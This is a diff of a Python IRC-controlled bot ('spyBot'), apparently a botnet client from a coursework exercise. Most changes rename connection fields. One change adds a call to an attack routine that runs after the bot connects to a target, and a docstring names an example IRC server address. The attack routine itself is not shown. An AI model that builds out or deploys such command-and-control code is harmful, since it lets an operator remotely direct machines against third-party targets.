@@ -15,14 +15,15 @@ BUFFER_SIZE = 2040
 class Bot():
     def __init__(self, hostname, port, channel, secret_phrase):
         # init bot
-        self.hostname = hostname
-        self.port = port
+        self.irc_host = hostname
+        self.irc_port = port
         self.channel = '#' + channel
         self.secret_phrase = secret_phrase
         self.irc_socket = None
         self.nickname = 'spyBot'
         self.controller = None
         self.controller_nickname = None
+        self.target_socket = None
         self.target_host = None
         self.target_port = None
     
@@ -65,13 +66,13 @@ class Bot():
             162.246.156.17
             12399
         '''
-        log('Connecting to: {}:{}, channel: {}'.format(self.hostname, int(self.port), self.channel))
+        log('Connecting to: {}:{}, channel: {}'.format(self.irc_host, int(self.irc_port), self.channel))
         self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
             try:
-                self.irc_socket.connect((self.hostname, self.port))
+                self.irc_socket.connect((self.irc_host, self.irc_port))
             except:
-                log('Can\'t connect to: {}:{}, channel: {}'.format(self.hostname, int(self.port), self.channel))
+                log('Can\'t connect to: {}:{}, channel: {}'.format(self.irc_host, int(self.irc_port), self.channel))
             break
         self.__authenticate()
     
@@ -232,7 +233,7 @@ class Bot():
         self.__connect_to_target()
         
         # perform attack
-
+        self.__attack()
     
     def __do_move(self, cmd):
         '''
@@ -244,9 +245,9 @@ class Bot():
         except ValueError:
             raise ValueError('Failed to split move.')
         log('Moving to {}:{}, channel {}'.format(host, int(port), channel))
-        self.hostname = host
+        self.irc_host = host
         if self.__validate_port(port):
-            self.port = int(port)
+            self.irc_port = int(port)
         else:
             raise ValueError('Invalid port: {}'.format(port))
         self.channel = '#' + channel
